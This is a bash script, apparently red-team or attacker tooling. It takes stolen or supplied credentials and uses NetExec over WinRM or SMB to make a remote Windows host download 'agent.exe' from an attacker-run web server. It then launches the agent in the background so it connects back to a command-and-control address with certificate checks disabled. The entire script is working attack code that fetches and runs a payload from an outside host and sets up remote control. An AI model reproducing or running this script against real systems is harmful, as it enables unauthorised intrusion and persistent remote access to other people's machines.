#!/bin/bash

TARGET="$1"
USER="$2"
PASS="$3"
C2IP="$4"
C2PORT="$5"

read -p "Choose protocol (smb/winrm): " PROTOCOL

# Start python web server in background
python3 -m http.server 80 >/dev/null 2>&1 &
HTTP_PID=$!

echo "Python webserver started on port 80 (PID: $HTTP_PID)"

if [[ "$PROTOCOL" == "winrm" ]]; then
    nxc winrm "$TARGET" -u "$USER" -p "$PASS" -X "iwr http://$C2IP/agent.exe -o agent.exe"
    nohup nxc winrm "$TARGET" -u "$USER" -p "$PASS" -X ".\\agent.exe -connect $C2IP:$C2PORT -ignore-cert" >/dev/null 2>&1 &
elif [[ "$PROTOCOL" == "smb" ]]; then
    nxc smb "$TARGET" -u "$USER" -p "$PASS" -X "iwr http://$C2IP/agent.exe -o agent.exe"
    nohup nxc smb "$TARGET" -u "$USER" -p "$PASS" -X ".\\agent.exe -connect $C2IP:$C2PORT -ignore-cert" >/dev/null 2>&1 &
else
    echo "Invalid protocol selected. Exiting."
    kill -9 $HTTP_PID 2>/dev/null
    exit 1
fi

# Cleanup after giving time to start
echo "Waiting briefly to ensure agent starts..."
sleep 3
kill -9 $HTTP_PID 2>/dev/null
echo "Webserver stopped."
echo "[*] Done."
exit 0
